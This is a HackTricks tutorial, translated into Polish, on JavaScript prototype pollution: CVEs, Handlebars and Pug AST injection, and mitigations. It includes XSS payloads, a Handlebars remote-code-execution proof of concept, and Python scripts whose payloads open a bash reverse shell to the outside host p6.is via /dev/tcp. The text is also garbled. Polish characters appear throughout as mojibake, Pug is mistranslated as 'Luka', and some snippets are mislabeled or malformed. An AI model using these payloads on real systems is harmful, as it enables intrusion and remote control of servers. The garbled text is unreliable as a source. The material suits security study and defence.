# NodeJS - Zanieczyszczenie \_\_proto\_\_ & prototype

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siƒô swoimi sztuczkami hakowania, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w na GitHubie.

</details>

## Obiekty w JavaScript <a href="#id-053a" id="id-053a"></a>

Obiekty w JavaScript sƒÖ w zasadzie kolekcjami par klucz-warto≈õƒá, znanych jako w≈Ça≈õciwo≈õci. Obiekt mo≈ºna utworzyƒá za pomocƒÖ `Object.create` z `null` jako argumentem, aby utworzyƒá pusty obiekt. Ta metoda pozwala na utworzenie obiektu bez dziedziczonych w≈Ça≈õciwo≈õci.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
### Funkcje i Klasy w JavaScript

W JavaScript, klasy i funkcje sƒÖ ≈õci≈õle powiƒÖzane, gdzie funkcje czƒôsto pe≈ÇniƒÖ rolƒô konstruktor√≥w dla klas. Pomimo braku natywnej obs≈Çugi klas w JavaScript, konstruktory mogƒÖ emulowaƒá zachowanie klas.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypy w JavaScript

JavaScript pozwala na modyfikacjƒô, dodawanie lub usuwanie atrybut√≥w prototypu w czasie wykonywania. Ta elastyczno≈õƒá umo≈ºliwia dynamiczne rozszerzanie funkcjonalno≈õci klasy.

Funkcje takie jak `toString` i `valueOf` mogƒÖ byƒá zmienione, aby zmieniƒá ich zachowanie, co pokazuje adaptacyjny charakter systemu prototyp√≥w w JavaScript.

## Dziedziczenie

W programowaniu opartym na prototypach, w≈Ça≈õciwo≈õci/metody sƒÖ dziedziczone przez obiekty z klas. Te klasy sƒÖ tworzone poprzez dodawanie w≈Ça≈õciwo≈õci/metod albo do instancji innej klasy, albo do pustego obiektu.

Warto zauwa≈ºyƒá, ≈ºe gdy w≈Ça≈õciwo≈õƒá jest dodawana do obiektu s≈Çu≈ºƒÖcego jako prototyp dla innych obiekt√≥w (takich jak `myPersonObj`), dziedziczƒÖce obiekty uzyskujƒÖ dostƒôp do tej nowej w≈Ça≈õciwo≈õci. Jednak ta w≈Ça≈õciwo≈õƒá nie jest automatycznie wy≈õwietlana, chyba ≈ºe jest jawnie wywo≈Çana.

## Zanieczyszczenie \_\_proto\_\_ <a href="#id-0d0a" id="id-0d0a"></a>

## Badanie zanieczyszczenia prototypu w JavaScript

Obiekty JavaScript sƒÖ definiowane przez pary klucz-warto≈õƒá i dziedziczƒÖ po prototypie obiektu JavaScript. Oznacza to, ≈ºe zmiana prototypu Object mo≈ºe wp≈ÇynƒÖƒá na wszystkie obiekty w ≈õrodowisku.

Przyjrzyjmy siƒô innemu przyk≈Çadowi, aby to zilustrowaƒá:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Dostƒôp do prototypu obiektu jest mo≈ºliwy poprzez:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Poprzez dodanie w≈Ça≈õciwo≈õci do prototypu Object, ka≈ºdy obiekt JavaScript odziedziczy te nowe w≈Ça≈õciwo≈õci:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## zanieczyszczenie prototypu

Dla scenariusza, w kt√≥rym korzystanie z `__proto__` jest ograniczone, modyfikacja prototypu funkcji jest alternatywƒÖ:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
To dotyczy tylko obiekt√≥w utworzonych za pomocƒÖ konstruktora `Vehicle`, nadajƒÖc im w≈Ça≈õciwo≈õci `beep`, `hasWheels`, `honk` i `isElectric`.

Dwa sposoby globalnego wp≈Çywania na obiekty JavaScript poprzez zanieczyszczanie prototypu obejmujƒÖ:

1. Zanieczyszczanie `Object.prototype` bezpo≈õrednio:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Zanieczyszczanie prototypu konstruktora dla powszechnie u≈ºywanej struktury:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Po tych operacjach ka≈ºdy obiekt JavaScript mo≈ºe wykonaƒá metody `goodbye` i `greet`.

## Zanieczyszczanie innych obiekt√≥w

### Z klasy do Object.prototype

W scenariuszu, gdzie mo≈ºesz **zanieczy≈õciƒá okre≈õlony obiekt** i musisz **dostaƒá siƒô do `Object.prototype`**, mo≈ºesz wyszukaƒá go za pomocƒÖ kodu podobnego do poni≈ºszego:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Zanieczyszczanie element√≥w tablicy

Zauwa≈º, ≈ºe tak jak mo≈ºesz zanieczy≈õciƒá atrybuty obiekt√≥w w JS, je≈õli masz dostƒôp do zanieczyszczenia tablicy, mo≈ºesz r√≥wnie≈º **zanieczy≈õciƒá warto≈õci tablicy** dostƒôpne **poprzez indeksy** (zauwa≈º, ≈ºe nie mo≈ºesz nadpisaƒá warto≈õci, dlatego musisz zanieczy≈õciƒá indeksy, kt√≥re sƒÖ w jaki≈õ spos√≥b u≈ºywane, ale nie zapisywane).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Zanieczyszczenie element√≥w Html

Podczas generowania elementu HTML za pomocƒÖ JS mo≈ºna **nadpisaƒá** atrybut **`innerHTML`**, aby napisaƒá **dowolny kod HTML.** [Pomys≈Ç i przyk≈Çad z tego wpisu](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Przyk≈Çady

### Podstawowy przyk≈Çad

Zanieczyszczenie prototypu wystƒôpuje z powodu b≈Çƒôdu w aplikacji, kt√≥ry pozwala na nadpisanie w≈Ça≈õciwo≈õci w `Object.prototype`. Oznacza to, ≈ºe poniewa≈º wiƒôkszo≈õƒá obiekt√≥w czerpie swoje w≈Ça≈õciwo≈õci z `Object.prototype`.

Najprostszym przyk≈Çadem jest dodanie warto≈õci do **niezdefiniowanej atrybutu obiektu**, kt√≥ry ma zostaƒá sprawdzony, na przyk≈Çad:
```javascript
if (user.admin) {
```
Je≈õli atrybut **`admin` jest niezdefiniowany**, istnieje mo≈ºliwo≈õƒá nadu≈ºycia prototypowego zanieczyszczenia i ustawienia go na True za pomocƒÖ:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Mechanizm polega na manipulowaniu w≈Ça≈õciwo≈õciami w taki spos√≥b, ≈ºe je≈õli atakujƒÖcy ma kontrolƒô nad okre≈õlonymi danymi wej≈õciowymi, mo≈ºe zmodyfikowaƒá prototyp wszystkich obiekt√≥w w aplikacji. Manipulacja ta zazwyczaj polega na ustawieniu w≈Ça≈õciwo≈õci `__proto__`, kt√≥ra w jƒôzyku JavaScript jest synonimem bezpo≈õredniej modyfikacji prototypu obiektu.

Warunki, w kt√≥rych atak ten mo≈ºe byƒá skutecznie wykonany, jak opisano w konkretnym [studium](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), obejmujƒÖ:

* Wykonywanie rekurencyjnego scalania.
* Definiowanie w≈Ça≈õciwo≈õci na podstawie ≈õcie≈ºki.
* Klonowanie obiekt√≥w.

### Nadpisanie funkcji
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Zanieczyszczenie prototypu w celu zdalnego wykonania kodu

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Zanieczyszczenie prototypu po stronie klienta w celu XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Atak zanieczyszczenia prototypu poprzez jQuery $ .extend

[Aby uzyskaƒá wiƒôcej informacji, sprawd≈∫ ten artyku≈Ç](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) W jQuery, funkcja `$ .extend` mo≈ºe prowadziƒá do zanieczyszczenia prototypu, je≈õli funkcja kopiowania g≈Çƒôbokiego jest u≈ºywana nieprawid≈Çowo. Ta funkcja jest czƒôsto u≈ºywana do klonowania obiekt√≥w lub ≈ÇƒÖczenia w≈Ça≈õciwo≈õci z obiektu domy≈õlnego. Jednak≈ºe, gdy jest ≈∫le skonfigurowana, w≈Ça≈õciwo≈õci przeznaczone dla nowego obiektu mogƒÖ byƒá przypisane do prototypu. Na przyk≈Çad:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Ta podatno≈õƒá, zidentyfikowana jako CVE-2019‚Äì11358, ilustruje, jak g≈Çƒôboka kopia mo≈ºe nieumy≈õlnie modyfikowaƒá prototyp, prowadzƒÖc do potencjalnych zagro≈ºe≈Ñ dla bezpiecze≈Ñstwa, takich jak nieautoryzowany dostƒôp administratora, je≈õli w≈Ça≈õciwo≈õci takie jak `isAdmin` sƒÖ sprawdzane bez odpowiedniej weryfikacji istnienia.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Atak zanieczyszczenia prototypu poprzez lodash

[Aby uzyskaƒá wiƒôcej szczeg√≥≈Ç√≥w, sprawd≈∫ ten artyku≈Ç](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) napotka≈Ç podobne podatno≈õci na zanieczyszczenie prototypu (CVE-2018‚Äì3721, CVE-2019‚Äì10744). Te problemy zosta≈Çy rozwiƒÖzane w wersji 4.17.11.

### Inny samouczek z CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Narzƒôdzia do wykrywania zanieczyszczenia prototypu

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Rozszerzenie Burp Suite zaprojektowane do wykrywania i analizowania podatno≈õci na zanieczyszczenie prototypu po stronie serwera w aplikacjach internetowych. Narzƒôdzie to automatyzuje proces skanowania ≈ºƒÖda≈Ñ w celu zidentyfikowania potencjalnych problem√≥w z zanieczyszczeniem prototypu. Wykorzystuje znane gad≈ºety - metody wykorzystywania zanieczyszczenia prototypu do wykonywania szkodliwych dzia≈Ça≈Ñ - skupiajƒÖc siƒô szczeg√≥lnie na bibliotekach Node.js.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): To rozszerzenie identyfikuje podatno≈õci na zanieczyszczenie prototypu po stronie serwera. Wykorzystuje techniki opisane w [zanieczyszczeniu prototypu po stronie serwera](https://portswigger.net/research/server-side-prototype-pollution).

### Zanieczyszczenie prototypu AST w NodeJS

NodeJS szeroko wykorzystuje Drzewa Sk≈Çadni Abstrakcyjnej (AST) w JavaScript do funkcji takich jak silniki szablon√≥w i TypeScript. Ta sekcja bada podatno≈õci zwiƒÖzane z zanieczyszczeniem prototypu w silnikach szablon√≥w, w szczeg√≥lno≈õci Handlebars i Pug.

#### Analiza podatno≈õci Handlebars

Silnik szablon√≥w Handlebars jest podatny na atak zanieczyszczenia prototypu. Ta podatno≈õƒá wynika z konkretnych funkcji w pliku `javascript-compiler.js`. Funkcja `appendContent`, na przyk≈Çad, ≈ÇƒÖczy `pendingContent`, je≈õli jest obecny, podczas gdy funkcja `pushSource` resetuje `pendingContent` na `undefined` po dodaniu ≈∫r√≥d≈Ça.

**Proces eksploatacji**

Eksploatacja wykorzystuje AST (Drzewo Sk≈Çadni Abstrakcyjnej) wygenerowane przez Handlebars, postƒôpujƒÖc zgodnie z tymi krokami:

1. **Manipulacja przez Parser**: PoczƒÖtkowo parser, poprzez wƒôze≈Ç `NumberLiteral`, narzuca, ≈ºe warto≈õci sƒÖ numeryczne. Zanieczyszczenie prototypu mo≈ºe ominƒÖƒá to, umo≈ºliwiajƒÖc wstawienie nie numerycznych ciƒÖg√≥w znak√≥w.
2. **Obs≈Çuga przez Kompilator**: Kompilator mo≈ºe przetwarzaƒá obiekt AST lub szablon ≈Ça≈Ñcuchowy. Je≈õli `input.type` r√≥wna siƒô `Program`, wej≈õcie jest traktowane jako wstƒôpnie sparsowane, co mo≈ºna wykorzystaƒá.
3. **Wstrzykniƒôcie Kodu**: Poprzez manipulacjƒô `Object.prototype`, mo≈ºna wstrzyknƒÖƒá dowolny kod do funkcji szablonu, co mo≈ºe prowadziƒá do zdalnego wykonania kodu.

Przyk≈Çad demonstrujƒÖcy eksploatacjƒô podatno≈õci Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Ten kod prezentuje, jak atakujƒÖcy mo≈ºe wstrzyknƒÖƒá dowolny kod do szablonu Handlebars.

**Zewnƒôtrzne odniesienie**: Znaleziono problem zwiƒÖzany z zanieczyszczeniem prototypu w bibliotece 'flat', jak szczeg√≥≈Çowo opisano tutaj: [Problem na GitHub](https://github.com/hughsk/flat/issues/105).

**Zewnƒôtrzne odniesienie**: [Problem zwiƒÖzany z zanieczyszczeniem prototypu w bibliotece 'flat'](https://github.com/hughsk/flat/issues/105)

Przyk≈Çad wykorzystania zanieczyszczenia prototypu w Pythonie:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Luka Vulnerability

Luka, inny silnik szablon√≥w, stoi w obliczu podobnego ryzyka zanieczyszczenia prototypu. Szczeg√≥≈Çowe informacje sƒÖ dostƒôpne w dyskusji na temat [Wstrzykniƒôcia AST w Luce](https://blog.p6.is/AST-Injection/#Pug).

Przyk≈Çad zanieczyszczenia prototypu w Luce:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### ≈örodki zapobiegawcze

Aby zmniejszyƒá ryzyko zanieczyszczenia prototypu, mo≈ºna zastosowaƒá poni≈ºsze strategie:

1. **NiezmiennosÃÅcÃÅ obiektu**: `Object.prototype` mo≈ºna uczyniƒá niemutowalnym, stosujƒÖc `Object.freeze`.
2. **Walidacja wej≈õcia**: Dane JSON powinny byƒá rygorystycznie walidowane zgodnie z schematem aplikacji.
3. **Bezpieczne funkcje scalania**: Nale≈ºy unikaƒá niebezpiecznego u≈ºycia rekurencyjnych funkcji scalania.
4. **Obiekty bez prototypu**: Obiekty bez w≈Ça≈õciwo≈õci prototypu mo≈ºna tworzyƒá za pomocƒÖ `Object.create(null)`.
5. **U≈ºycie Map**: Zamiast `Object`, do przechowywania par klucz-warto≈õƒá nale≈ºy u≈ºywaƒá `Map`.
6. **Aktualizacje bibliotek**: Poprawki bezpiecze≈Ñstwa mo≈ºna wdro≈ºyƒá regularnie aktualizujƒÖc biblioteki.
7. **Narzƒôdzia do analizy statycznej i linter**: U≈ºywaj narzƒôdzi takich jak ESLint z odpowiednimi wtyczkami do wykrywania i zapobiegania podatno≈õciom na zanieczyszczenie prototypu.
8. **PrzeglƒÖdy kodu**: Wdro≈ºenie dok≈Çadnych przeglƒÖd√≥w kodu w celu identyfikacji i usuwania potencjalnych ryzyk zwiƒÖzanych z zanieczyszczeniem prototypu.
9. **Szkolenia z bezpiecze≈Ñstwa**: Edukuj programist√≥w na temat ryzyka zanieczyszczenia prototypu i najlepszych praktyk pisania bezpiecznego kodu.
10. **U≈ºywanie bibliotek ostro≈ºnie**: BƒÖd≈∫ ostro≈ºny podczas korzystania z bibliotek innych firm. Oceniaj ich postawƒô w zakresie bezpiecze≈Ñstwa i przeglƒÖdaj ich kod, zw≈Çaszcza te manipulujƒÖce obiektami.
11. **Ochrona w czasie wykonywania**: Stosuj mechanizmy ochrony w czasie wykonywania, takie jak korzystanie z pakiet√≥w npm skoncentrowanych na bezpiecze≈Ñstwie, kt√≥re mogƒÖ wykrywaƒá i zapobiegaƒá atakom zanieczyszczenia prototypu.

## Odno≈õniki

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siƒô swoimi sztuczkami hakowania, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
